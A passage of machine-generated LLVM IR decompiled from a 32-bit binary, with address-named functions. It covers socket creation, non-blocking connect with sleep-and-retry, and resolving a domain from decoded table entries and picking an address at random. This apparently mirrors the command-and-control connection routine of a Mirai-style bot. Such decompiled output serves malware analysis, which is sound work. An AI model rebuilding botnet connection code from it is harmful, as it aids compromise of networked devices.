  %v14_804e369 = icmp eq i32 %v2_804e369, %v1_804e368
  br i1 %v14_804e369, label %dec_label_pc_804e2ca, label %dec_label_pc_804e24a

dec_label_pc_804e378:                             ; preds = %dec_label_pc_804e270
  %v1_804e378 = add i32 %v0_804e378, 1
  %v2_804e379 = load i32, i32* %v1_804e379, align 4
  %v14_804e379 = icmp eq i32 %v2_804e379, %v1_804e378
  br i1 %v14_804e379, label %dec_label_pc_804e2ca, label %dec_label_pc_804e282

dec_label_pc_804e388:                             ; preds = %dec_label_pc_804e2aa
  %v1_804e388 = add i32 %v0_804e388128, 1
  %v12_804e389 = icmp eq i32 %v3_804e288, %v1_804e388
  br i1 %v12_804e389, label %dec_label_pc_804e2ca, label %dec_label_pc_804e2a0.backedge

dec_label_pc_804e2a0.backedge:                    ; preds = %dec_label_pc_804e388, %dec_label_pc_804e2b9
  %v3_804e2b091 = phi i32 [ 0, %dec_label_pc_804e2b9 ], [ %v1_804e388, %dec_label_pc_804e388 ]
  %storemerge32.in = add i32 %v0_804e391129, 1
  %v1_804e2a0 = add i32 %v1_804e2a0131, -1
  store i32 %v1_804e2a0, i32* @ebx, align 4
  %v10_804e2a1 = icmp eq i32 %v1_804e2a0131, 0
  br i1 %v10_804e2a1, label %dec_label_pc_804e18c, label %dec_label_pc_804e2aa

dec_label_pc_804e397:                             ; preds = %dec_label_pc_804e18c
  %v2_804e39a = inttoptr i32 %v0_804e1a1 to i32*
  store i32 12, i32* %v2_804e39a, align 4
  %v2_804e39c = call i32 @function_8051280(i8 0)
  store i32 %v2_804e39c, i32* %eax.global-to-local, align 4
  %v0_804e3a1 = load i32, i32* @esp, align 4
  %v1_804e3a1 = inttoptr i32 %v0_804e3a1 to i32*
  store i32 13, i32* %v1_804e3a1, align 4
  %v2_804e3a8 = call i32 @function_8051280(i8 0)
  store i32 %v2_804e3a8, i32* %eax.global-to-local, align 4
  %v0_804e3ad = load i32, i32* @esp, align 4
  %v1_804e3ad = inttoptr i32 %v0_804e3ad to i32*
  store i32 14, i32* %v1_804e3ad, align 4
  %v2_804e3b4 = call i32 @function_8051280(i8 0)
  store i32 %v2_804e3b4, i32* %eax.global-to-local, align 4
  %v0_804e3b9 = load i32, i32* @esp, align 4
  %v1_804e3b9 = inttoptr i32 %v0_804e3b9 to i32*
  store i32 15, i32* %v1_804e3b9, align 4
  %v2_804e3c0 = call i32 @function_8051280(i8 0)
  store i32 %v2_804e3c0, i32* %eax.global-to-local, align 4
  %v0_804e3c5 = load i32, i32* @esp, align 4
  %v1_804e3c5 = inttoptr i32 %v0_804e3c5 to i32*
  store i32 16, i32* %v1_804e3c5, align 4
  %v2_804e3cc = call i32 @function_8051280(i8 0)
  store i32 %v2_804e3cc, i32* %eax.global-to-local, align 4
  %v0_804e3d1 = load i32, i32* @esp, align 4
  %v1_804e3d1 = inttoptr i32 %v0_804e3d1 to i32*
  %v2_804e3d1 = load i32, i32* %v1_804e3d1, align 4
  store i32 %v2_804e3d1, i32* %eax.global-to-local, align 4
  %v1_804e3d2 = add i32 %v0_804e3d1, 56
  %v2_804e3d2 = inttoptr i32 %v1_804e3d2 to i32*
  %v3_804e3d2 = load i32, i32* %v2_804e3d2, align 4
  store i32 %v3_804e3d2, i32* @edi, align 4
  store i32 %v3_804e3d2, i32* %v1_804e3d1, align 4
  %v1_804e3d7 = call i32 @function_80521f1(i32 0)
  store i32 %v1_804e3d7, i32* @eax, align 4
  %v0_804e3dc = load i32, i32* @esp, align 4
  br label %dec_label_pc_804e31c

; uselistorder directives
  uselistorder i32 %v1_804e2a0, { 1, 0 }
  uselistorder i32 %v6_804e2ae, { 2, 0, 1 }
  uselistorder i32 %v0_804e391129, { 1, 0 }
  uselistorder i32 %v2_804e28f, { 1, 0 }
  uselistorder i32 %v3_804e288, { 1, 0, 2 }
  uselistorder i32 %v0_804e18c52, { 2, 1, 0 }
  uselistorder i32 %v0_804e297, { 0, 4, 5, 6, 3, 2, 1 }
  uselistorder i32 %v6_804e274, { 0, 2, 1 }
  uselistorder i32 %v0_804e378, { 1, 0 }
  uselistorder i32 %v0_804e263, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v2_804e25a, { 1, 0 }
  uselistorder i32 %v1_804e25a, { 2, 3, 0, 1, 4 }
  uselistorder i32 %v0_804e25a, { 1, 2, 3, 4, 7, 0, 8, 5, 6, 9 }
  uselistorder i32 %v0_804e250, { 1, 0 }
  uselistorder i32 %v6_804e23c, { 1, 0 }
  uselistorder i32 %v0_804e368, { 1, 0 }
  uselistorder i32 %v0_804e22f, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v2_804e226, { 1, 0 }
  uselistorder i32 %v0_804e226, { 0, 3, 1, 2, 4 }
  uselistorder i32 %v0_804e21c, { 1, 0 }
  uselistorder i32 %v6_804e208, { 1, 0 }
  uselistorder i32 %v0_804e358, { 1, 0 }
  uselistorder i32 %v0_804e1fb, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v2_804e1f2, { 1, 0 }
  uselistorder i32 %v0_804e1f2, { 0, 3, 1, 2, 4 }
  uselistorder i32 %v0_804e1e8, { 1, 0 }
  uselistorder i32 %v6_804e1d4, { 1, 0 }
  uselistorder i32 %v0_804e2c0, { 1, 0 }
  uselistorder i32 %v0_804e1c1, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v2_804e1b8, { 1, 0 }
  uselistorder i32 %v0_804e1b8, { 0, 3, 1, 2, 4 }
  uselistorder i32 %v1_804e18c, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_804e0c7, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_804e0a4, { 0, 4, 1, 2, 3 }
  uselistorder i32 %v3_804e09f, { 1, 0, 2, 3 }
  uselistorder i32 %v0_804e03a, { 1, 0 }
  uselistorder i32 %v0_804e031, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32 %v0_804e02c, { 1, 0, 2, 3 }
  uselistorder i32 %v0_804e03a.pre, { 0, 5, 4, 3, 2, 1 }
  uselistorder i32 %v0_804e013, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v0_804dfda, { 0, 2, 1 }
  uselistorder i32 %v4_804df95, { 1, 0, 2, 3 }
  uselistorder i32 %v0_804df3a, { 2, 1, 0 }
  uselistorder i32 %v0_804def4, { 1, 0, 2 }
  uselistorder i32 %v1_804dea1, { 1, 0 }
  uselistorder i32 %v1_804de9e, { 2, 1, 0 }
  uselistorder i32 %v0_804de9e, { 1, 0, 2 }
  uselistorder i32 %v2_804de9c, { 0, 2, 1, 3 }
  uselistorder i32 %v2_804deb8, { 0, 2, 1, 3 }
  uselistorder i32 %v1_804de6d, { 1, 0 }
  uselistorder i32 %v1_804de6a, { 1, 0, 2 }
  uselistorder i32 %v0_804de5d, { 1, 0, 2, 3 }
  uselistorder i32 %v0_804de58, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v0_804de50, { 1, 0 }
  uselistorder i32 %v3_804dd85, { 2, 1, 0, 3 }
  uselistorder i32 %v0_804dd43, { 1, 0, 2 }
  uselistorder i32 %v2_804dd2f, { 3, 2, 4, 0, 5, 6, 7, 8, 1, 9, 10 }
  uselistorder i32 %v1_804dcf2, { 0, 2, 1 }
  uselistorder i32 %v3_804dcb4, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v3_804dc67, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v0_804dc13, { 1, 0, 3, 2, 4 }
  uselistorder i32* %stack_var_-52, { 1, 2, 0 }
  uselistorder i32* %eax.global-to-local, { 129, 130, 131, 132, 133, 134, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 135, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128 }
  uselistorder i32 8424, { 1, 0 }
  uselistorder i32 ()* @function_8052544, { 2, 1, 0 }
  uselistorder i32 ()* @function_8051fc0, { 3, 2, 1, 0 }
  uselistorder i32 (i8*, i32, i32)* @function_8051f40, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 18, 19, 20, 21, 10, 11, 12, 13, 14, 15, 16, 17 }
  uselistorder i32 8264, { 0, 2, 1 }
  uselistorder i32 8328, { 0, 1, 3, 2 }
  uselistorder i32 ()* @function_80526a5, { 3, 2, 0, 1 }
  uselistorder i32 (i32)* @function_80525b4, { 2, 1, 0 }
  uselistorder i32 4095, { 1, 0 }
  uselistorder i32 (i8*, i32)* @function_8051c70, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 25, 24, 27, 28, 29, 30, 26, 31, 32, 33, 34, 58, 59, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 60, 61, 62, 63 }
  uselistorder i8 7, { 3, 4, 5, 6, 7, 1, 2, 0 }
  uselistorder label %dec_label_pc_804e31c, { 1, 2, 0 }
  uselistorder label %dec_label_pc_804e2ca, { 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_804e2aa, { 1, 0 }
  uselistorder label %dec_label_pc_804e288, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804e270, { 1, 0 }
  uselistorder label %dec_label_pc_804e250, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804e238, { 1, 0 }
  uselistorder label %dec_label_pc_804e21c, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804e204, { 1, 0 }
  uselistorder label %dec_label_pc_804e1e8, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804e1d0, { 1, 0 }
  uselistorder label %dec_label_pc_804e18c, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_804e0c7, { 1, 0 }
  uselistorder label %dec_label_pc_804e0bb, { 1, 0 }
  uselistorder label %dec_label_pc_804e038, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804dffd, { 1, 0 }
  uselistorder label %dec_label_pc_804de50, { 6, 3, 1, 0, 4, 5, 2, 7 }
  uselistorder label %dec_label_pc_804dde2, { 1, 0 }
  uselistorder label %dec_label_pc_804dce1, { 1, 0 }
  uselistorder label %dec_label_pc_804dc94, { 1, 0 }
}

define i32 @function_804e3f0() local_unnamed_addr {
dec_label_pc_804e3f0:
  store i32 134538560, i32* @global_var_8056814.24, align 4
  %v0_804e3fa = load i32, i32* @eax, align 4
  ret i32 %v0_804e3fa
}

define i32 @function_804e400() local_unnamed_addr {
dec_label_pc_804e400:
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  store i32 1, i32* %stack_var_-12, align 4
  %v3_804e413 = call i32 @function_80529e5(i32 2, i32 1, i32 0)
  store i32 %v3_804e413, i32* @global_var_805680c.25, align 4
  %v10_804e422 = icmp eq i32 %v3_804e413, -1
  br i1 %v10_804e422, label %dec_label_pc_804e4c0, label %dec_label_pc_804e42b

dec_label_pc_804e42b:                             ; preds = %dec_label_pc_804e400
  %v2_804e430 = ptrtoint i32* %stack_var_-12 to i32
  %v5_804e43a = call i32 @function_80529aa(i32 %v3_804e413, i32 1, i32 2, i32 %v2_804e430, i32 4)
  %v0_804e442 = load i32, i32* @global_var_805680c.25, align 4
  %v3_804e44c = call i32 @function_805212d(i32 %v0_804e442, i32 3, i32 0)
  %v12_804e454 = or i32 %v3_804e44c, 2048
  %v0_804e458 = load i32, i32* @global_var_805680c.25, align 4
  %v3_804e460 = call i32 @function_805212d(i32 %v0_804e458, i32 4, i32 %v12_804e454)
  %v0_804e46d = load i8, i8* @global_var_8056818.26, align 8
  %v1_804e46d = icmp eq i8 %v0_804e46d, 0
  br i1 %v1_804e46d, label %dec_label_pc_804e4c6, label %dec_label_pc_804e476

dec_label_pc_804e476:                             ; preds = %dec_label_pc_804e42b, %dec_label_pc_804e4c6
  store i32 2, i32* %stack_var_-28, align 4
  %v1_804e488 = call i32 @function_8052729(i32 2)
  %v2_804e48d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v1_804e488, i32* @ebx, align 4
  %v1_804e493 = inttoptr i32 %v1_804e488 to i32*
  store i32 0, i32* %v1_804e493, align 4
  %v0_804e49a = load i32, i32* @global_var_805680c.25, align 4
  %v4_804e4a3 = call i32 @function_80527df(i32 %v0_804e49a, i32 %v2_804e48d, i32 16, i32 %v1_804e488)
  %v8_804e4ab = icmp eq i32 %v4_804e4a3, -1
  br i1 %v8_804e4ab, label %dec_label_pc_804e4d0, label %dec_label_pc_804e4ae

dec_label_pc_804e4ae:                             ; preds = %dec_label_pc_804e476
  %v0_804e4ae = load i32, i32* @global_var_805680c.25, align 4
  %v2_804e4b8 = call i32 @function_805289b(i32 %v0_804e4ae, i32 1)
  br label %dec_label_pc_804e4c0

dec_label_pc_804e4c0:                             ; preds = %dec_label_pc_804e400, %dec_label_pc_804e4ae
  %v0_804e4c5 = phi i32 [ -1, %dec_label_pc_804e400 ], [ %v2_804e4b8, %dec_label_pc_804e4ae ]
  ret i32 %v0_804e4c5

dec_label_pc_804e4c6:                             ; preds = %dec_label_pc_804e42b
  br label %dec_label_pc_804e476

dec_label_pc_804e4d0:                             ; preds = %dec_label_pc_804e476
  %v0_804e4d0 = load i32, i32* @ebx, align 4
  %v1_804e4d0 = inttoptr i32 %v0_804e4d0 to i32*
  %v2_804e4d0 = load i32, i32* %v1_804e4d0, align 4
  %v11_804e4d0 = icmp eq i32 %v2_804e4d0, 99
  br i1 %v11_804e4d0, label %dec_label_pc_804e52e, label %dec_label_pc_804e4d5

dec_label_pc_804e4d5:                             ; preds = %dec_label_pc_804e4d0, %dec_label_pc_804e52e
  store i32 2, i32* %stack_var_-28, align 4
  %v0_804e4ef = load i32, i32* @global_var_805680c.25, align 4
  store i32 %v0_804e4ef, i32* @esi, align 4
  %v3_804e4f6 = call i32 @function_805280a(i32 %v0_804e4ef, i32 %v2_804e48d, i32 16)
  %v1_804e502 = call i32 @function_8053da0(i32 5)
  store i32 5, i32* @ebx, align 4
  %v0_804e508 = load i32, i32* @global_var_805680c.25, align 4
  %v1_804e50f = call i32 @function_80521f1(i32 %v0_804e508)
  %v1_804e51b = call i32 @function_804d5e0(i32 58811)
  %v0_804e520 = call i32 @function_804e400()
  ret i32 %v0_804e520

dec_label_pc_804e52e:                             ; preds = %dec_label_pc_804e4d0
  store i8 0, i8* @global_var_8056818.26, align 8
  br label %dec_label_pc_804e4d5

; uselistorder directives
  uselistorder i32 %v3_804e413, { 1, 0, 2 }
  uselistorder i32* %stack_var_-12, { 1, 0 }
  uselistorder i32* %stack_var_-28, { 0, 2, 1 }
  uselistorder i32 (i32)* @function_804d5e0, { 0, 2, 1 }
  uselistorder i32 (i32, i32)* @function_805289b, { 0, 2, 1 }
  uselistorder i32 (i32, i32, i32, i32)* @function_80527df, { 0, 2, 1 }
  uselistorder i8* @global_var_8056818.26, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @function_80529aa, { 1, 0 }
  uselistorder label %dec_label_pc_804e4d5, { 1, 0 }
  uselistorder label %dec_label_pc_804e4c0, { 1, 0 }
  uselistorder label %dec_label_pc_804e476, { 1, 0 }
}

define i32 @function_804e540() local_unnamed_addr {
dec_label_pc_804e540:
  %stack_var_-12 = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp4, i32* %stack_var_-12, align 4
  %stack_var_-28 = alloca i8*, align 4
  store i8* inttoptr (i32 3 to i8*), i8** %stack_var_-28, align 4
  %v3_804e547 = call i32 @function_8051300(i8 3)
  store i8* inttoptr (i32 3 to i8*), i8** %stack_var_-28, align 4
  %v4_804e552 = call i32 @function_8051250(i32 3, i32* null)
  %v4_804e557 = inttoptr i32 %v4_804e552 to i8*
  store i8* %v4_804e557, i8** %stack_var_-28, align 4
  %v3_804e55a = call i32 @function_804f340(i8* %v4_804e557)
  store i32 %v3_804e55a, i32* @esi, align 4
  store i8* inttoptr (i32 3 to i8*), i8** %stack_var_-28, align 4
  %v3_804e568 = call i32 @function_8051280(i8 3)
  %v2_804e570 = icmp eq i32 %v3_804e55a, 0
  br i1 %v2_804e570, label %dec_label_pc_804e5c6, label %dec_label_pc_804e574

dec_label_pc_804e574:                             ; preds = %dec_label_pc_804e540
  %v1_804e55f = inttoptr i32 %v3_804e55a to i8*
  %v2_804e574 = add i32 %v3_804e55a, 4
  %v3_804e574 = inttoptr i32 %v2_804e574 to i32*
  %v4_804e574 = load i32, i32* %v3_804e574, align 4
  store i32 %v4_804e574, i32* @ebx, align 4
  %v0_804e577 = load i8*, i8** %stack_var_-28, align 4
  %v1_804e577 = ptrtoint i8* %v0_804e577 to i32
  %v2_804e577 = call i32 @function_804f070(i32 %v1_804e577)
  %v3_804e577 = sext i32 %v2_804e577 to i64
  %v3_804e581 = load i8, i8* %v1_804e55f, align 1
  %v8_804e587 = zext i8 %v3_804e581 to i64
  %v11_804e587 = urem i64 %v3_804e577, %v8_804e587
  %v12_804e587 = trunc i64 %v11_804e587 to i32
  %v0_804e589 = load i32, i32* @ebx, align 4
  %v2_804e589 = mul nuw nsw i32 %v12_804e587, 4
  %v3_804e589 = add i32 %v2_804e589, %v0_804e589
  %v4_804e589 = inttoptr i32 %v3_804e589 to i32*
  %v5_804e589 = load i32, i32* %v4_804e589, align 4
  %tmp10 = bitcast i8** %stack_var_-28 to i32*
  store i32 %v3_804e55a, i32* %tmp10, align 4
  store i32 %v5_804e589, i32* @global_var_805696c.28, align 4
  %v2_804e592 = call i32 @function_804f300(i32 %v3_804e55a)
  store i8* inttoptr (i32 4 to i8*), i8** %stack_var_-28, align 4
  %v3_804e59e = call i32 @function_8051300(i8 4)
  store i8* inttoptr (i32 4 to i8*), i8** %stack_var_-28, align 4
  %v4_804e5a9 = call i32 @function_8051250(i32 4, i32* null)
  %v5_804e5a9 = inttoptr i32 %v4_804e5a9 to i16*
  %v3_804e5ae = load i16, i16* %v5_804e5a9, align 2
  store i8* inttoptr (i32 4 to i8*), i8** %stack_var_-28, align 4
  store i16 %v3_804e5ae, i16* bitcast (i32* @global_var_805696a.29 to i16*), align 4
  %v3_804e5be = call i32 @function_8051280(i8 4)
  %v2_804e5c6.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_804e5c6

dec_label_pc_804e5c6:                             ; preds = %dec_label_pc_804e540, %dec_label_pc_804e574
  %v2_804e5c6 = phi i32 [ %tmp4, %dec_label_pc_804e540 ], [ %v2_804e5c6.pre, %dec_label_pc_804e574 ]
  ret i32 %v2_804e5c6

; uselistorder directives
  uselistorder i32 %v3_804e55a, { 2, 1, 0, 5, 3, 4 }
  uselistorder i8** %stack_var_-28, { 7, 6, 5, 0, 8, 4, 3, 2, 1 }
  uselistorder label %dec_label_pc_804e5c6, { 1, 0 }
}

define i32 @function_804f070(i32 %arg1) local_unnamed_addr {
dec_label_pc_804f070:
  %v0_804f070 = load i32, i32* @global_var_80568e8.30, align 8
  %v0_804f078 = load i32, i32* @global_var_80568f4.31, align 4
  %v2_804f07e = mul i32 %v0_804f070, 2048
  %v2_804f083 = udiv i32 %v0_804f078, 524288
  store i32 %v2_804f083, i32* @ecx, align 4
  %v2_804f086 = xor i32 %v2_804f07e, %v0_804f070
  %v0_804f088 = load i32, i32* @global_var_80568ec.32, align 4
  store i32 %v0_804f088, i32* @global_var_80568e8.30, align 8
  %v0_804f092 = load i32, i32* @global_var_80568f0.33, align 16
  store i32 %v0_804f092, i32* @global_var_80568ec.32, align 4
  store i32 %v0_804f078, i32* @global_var_80568f0.33, align 16
  %v2_804f0a4 = xor i32 %v2_804f083, %v0_804f078
  %v2_804f0a6 = udiv i32 %v2_804f086, 256
  %v2_804f0a9 = xor i32 %v2_804f0a6, %v2_804f086
  %v2_804f0ab = xor i32 %v2_804f0a9, %v2_804f0a4
  store i32 %v2_804f0ab, i32* @global_var_80568f4.31, align 4
  ret i32 %v2_804f0ab

; uselistorder directives
  uselistorder i32 %v2_804f086, { 1, 0 }
  uselistorder i32 %v2_804f083, { 1, 0 }
  uselistorder i32 %v0_804f078, { 1, 2, 0 }
  uselistorder i32 %v0_804f070, { 1, 0 }
}

define i32 @function_804f300(i32 %arg1) local_unnamed_addr {
dec_label_pc_804f300:
  %stack_var_-12 = alloca i32, align 4
  %tmp12 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp12, i32* %stack_var_-12, align 4
  %v0_804f300 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_804f308 = icmp eq i32 %arg1, 0
  br i1 %v1_804f308, label %dec_label_pc_804f300.dec_label_pc_804f330_crit_edge, label %dec_label_pc_804f30c

dec_label_pc_804f300.dec_label_pc_804f330_crit_edge: ; preds = %dec_label_pc_804f300
  br label %dec_label_pc_804f330

dec_label_pc_804f30c:                             ; preds = %dec_label_pc_804f300
  %v1_804f30c = add i32 %arg1, 4
  %v2_804f30c = inttoptr i32 %v1_804f30c to i32*
  %v3_804f30c = load i32, i32* %v2_804f30c, align 4
  %v1_804f30f = icmp eq i32 %v3_804f30c, 0
  br i1 %v1_804f30f, label %dec_label_pc_804f31f, label %dec_label_pc_804f313

dec_label_pc_804f313:                             ; preds = %dec_label_pc_804f30c
  %v1_804f317 = call i32 @function_8053949(i32 %v3_804f30c)
  br label %dec_label_pc_804f31f

dec_label_pc_804f31f:                             ; preds = %dec_label_pc_804f30c, %dec_label_pc_804f313
  store i32 %v0_804f300, i32* @ebx, align 4
  %v1_804f326 = call i32 @function_8053949(i32 %arg1)
  %v2_804f330.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_804f330

dec_label_pc_804f330:                             ; preds = %dec_label_pc_804f300.dec_label_pc_804f330_crit_edge, %dec_label_pc_804f31f
  %v2_804f330 = phi i32 [ %tmp12, %dec_label_pc_804f300.dec_label_pc_804f330_crit_edge ], [ %v2_804f330.pre, %dec_label_pc_804f31f ]
  store i32 %v0_804f300, i32* @ebx, align 4
  ret i32 %v2_804f330

; uselistorder directives
  uselistorder i32 %arg1, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_804f330, { 1, 0 }
  uselistorder label %dec_label_pc_804f31f, { 1, 0 }
}

define i32 @function_804f340(i8* %arg1) local_unnamed_addr {
dec_label_pc_804f340:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-2207 = alloca i32, align 4
  %stack_var_-2208 = alloca i32, align 4
  store i32 0, i32* @esi, align 4
  %v4_804f34c = ptrtoint i8* %arg1 to i32
  store i32 %v4_804f34c, i32* @ebx, align 4
  %v4_804f357 = call i32 @function_80532f8(i64 1, i32 8)
  %v2_804f360 = ptrtoint i32* %stack_var_-2208 to i32
  store i32 %v2_804f360, i32* %eax.global-to-local, align 4
  %tmp103 = bitcast i32* %stack_var_-2208 to i8*
  %v0_804f36b = load i32, i32* @ebx, align 4
  %v4_804f36b = inttoptr i32 %v0_804f36b to i8*
  %v3_804f36e = call i32 @function_8051c50(i8* %v4_804f36b)
  %v2_804f373 = ptrtoint i32* %stack_var_-2207 to i32
  store i32 %v2_804f373, i32* %ecx.global-to-local, align 4
  store i32 %v2_804f360, i32* %edi.global-to-local, align 4
  %v1_804f37e = add i32 %v3_804f36e, 1
  store i32 %v1_804f37e, i32* %eax.global-to-local, align 4
  %tmp104 = icmp slt i32 %v1_804f37e, 1
  br i1 %tmp104, label %dec_label_pc_804f3aa, label %dec_label_pc_804f392.lr.ph

dec_label_pc_804f392.lr.ph:                       ; preds = %dec_label_pc_804f340
  %v0_804f392.pre = load i32, i32* @ebx, align 4
  %v4_804f392.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_804f392

dec_label_pc_804f384:                             ; preds = %dec_label_pc_804f399
  %v3_804f384 = inttoptr i32 %v2_804f384 to i8*
  store i8 %v2_804f392, i8* %v3_804f384, align 1
  %v0_804f386 = load i32, i32* @esi, align 4
  %v1_804f386 = add i32 %v0_804f386, 1
  store i32 %v1_804f386, i32* @esi, align 4
  %v0_804f387 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804f387 = add i32 %v0_804f387, 1
  store i32 %v1_804f387, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804f38a

dec_label_pc_804f38a:                             ; preds = %dec_label_pc_804f39d, %dec_label_pc_804f384
  %v0_804f38c = phi i32 [ %v1_804f3a3, %dec_label_pc_804f39d ], [ %v1_804f387, %dec_label_pc_804f384 ]
  %v0_804f38a = load i32, i32* @ebx, align 4
  %v1_804f38a = add i32 %v0_804f38a, 1
  store i32 %v1_804f38a, i32* @ebx, align 4
  %v0_804f38b = load i32, i32* %eax.global-to-local, align 4
  %v1_804f38b = add i32 %v0_804f38b, -1
  store i32 %v1_804f38b, i32* %eax.global-to-local, align 4
  store i32 %v0_804f38c, i32* %ecx.global-to-local, align 4
  %tmp105 = icmp slt i32 %v1_804f38b, 1
  br i1 %tmp105, label %dec_label_pc_804f38e.dec_label_pc_804f3aa_crit_edge, label %dec_label_pc_804f392

dec_label_pc_804f392:                             ; preds = %dec_label_pc_804f392.lr.ph, %dec_label_pc_804f38a
  %v2_804f384 = phi i32 [ %v2_804f373, %dec_label_pc_804f392.lr.ph ], [ %v0_804f38c, %dec_label_pc_804f38a ]
  %v4_804f392 = phi i32 [ %v4_804f392.pre, %dec_label_pc_804f392.lr.ph ], [ %v0_804f38c, %dec_label_pc_804f38a ]
  %v0_804f392 = phi i32 [ %v0_804f392.pre, %dec_label_pc_804f392.lr.ph ], [ %v1_804f38a, %dec_label_pc_804f38a ]
  %v1_804f392 = inttoptr i32 %v0_804f392 to i8*
  %v2_804f392 = load i8, i8* %v1_804f392, align 1
  %v3_804f392 = zext i8 %v2_804f392 to i32
  %v5_804f392 = and i32 %v4_804f392, -256
  %v6_804f392 = or i32 %v3_804f392, %v5_804f392
  store i32 %v6_804f392, i32* %edx.global-to-local, align 4
  %v10_804f394 = icmp eq i8 %v2_804f392, 46
  br i1 %v10_804f394, label %dec_label_pc_804f39d, label %dec_label_pc_804f399

dec_label_pc_804f399:                             ; preds = %dec_label_pc_804f392
  %v4_804f399 = icmp eq i8 %v2_804f392, 0
  %v1_804f39b = icmp eq i1 %v4_804f399, false
  br i1 %v1_804f39b, label %dec_label_pc_804f384, label %dec_label_pc_804f39d

dec_label_pc_804f39d:                             ; preds = %dec_label_pc_804f399, %dec_label_pc_804f392
  %v0_804f39d = load i32, i32* @esi, align 4
  store i32 0, i32* @esi, align 4
  %v1_804f3a1 = trunc i32 %v0_804f39d to i8
  %v2_804f3a1 = load i32, i32* %edi.global-to-local, align 4
  %v3_804f3a1 = inttoptr i32 %v2_804f3a1 to i8*
  store i8 %v1_804f3a1, i8* %v3_804f3a1, align 1
  %v0_804f3a3 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804f3a3 = add i32 %v0_804f3a3, 1
  store i32 %v1_804f3a3, i32* %edx.global-to-local, align 4
  store i32 %v0_804f3a3, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804f38a

dec_label_pc_804f38e.dec_label_pc_804f3aa_crit_edge: ; preds = %dec_label_pc_804f38a
  br label %dec_label_pc_804f3aa

dec_label_pc_804f3aa:                             ; preds = %dec_label_pc_804f38e.dec_label_pc_804f3aa_crit_edge, %dec_label_pc_804f340
  %v0_804f3ad = phi i32 [ %v0_804f38c, %dec_label_pc_804f38e.dec_label_pc_804f3aa_crit_edge ], [ %v2_804f373, %dec_label_pc_804f340 ]
  %v1_804f3ad = inttoptr i32 %v0_804f3ad to i8*
  store i8 0, i8* %v1_804f3ad, align 1
  store i32 %v2_804f360, i32* %eax.global-to-local, align 4
  %v3_804f3b5 = call i32 @function_8051c50(i8* %tmp103)
  store i32 0, i32* %stack_var_-44, align 4
  %v2_804f3c9 = add i32 %v3_804f3b5, %v2_804f360
  store i32 %v2_804f3c9, i32* @edi, align 4
  %v1_804f3ed = add i32 %v2_804f3c9, 1
  store i32 %v1_804f3ed, i32* @ebx, align 4
  store i32 %v2_804f360, i32* %eax.global-to-local, align 4
  %v3_804f3f5 = call i32 @function_8051c50(i8* %tmp103)
  %v1_804f3fa = add i32 %v3_804f3f5, 17
  store i32 %v1_804f3fa, i32* %eax.global-to-local, align 4
  %v1_804f401 = call i32 @function_804f070(i32 %v1_804f3fa)
  %v2_804f40f = udiv i32 %v1_804f401, 65535
  store i32 %v2_804f40f, i32* %edx.global-to-local, align 4
  %v2_804f41980 = add i32 %v2_804f40f, %v1_804f401
  store i32 %v2_804f41980, i32* @esi, align 4
  store i32 8, i32* @eax, align 4
  store i32 -1, i32* %ebp.global-to-local, align 4
  %v2_804f429 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_804f429, i32* %ecx.global-to-local, align 4
  %v3_804f431 = call i32 @function_8051ce0(i32 %v2_804f429, i32 16)
  store i32 %v3_804f431, i32* %eax.global-to-local, align 4
  store i32 2, i32* %stack_var_-44, align 4
  %v0_804f479 = load i32, i32* @edi, align 4
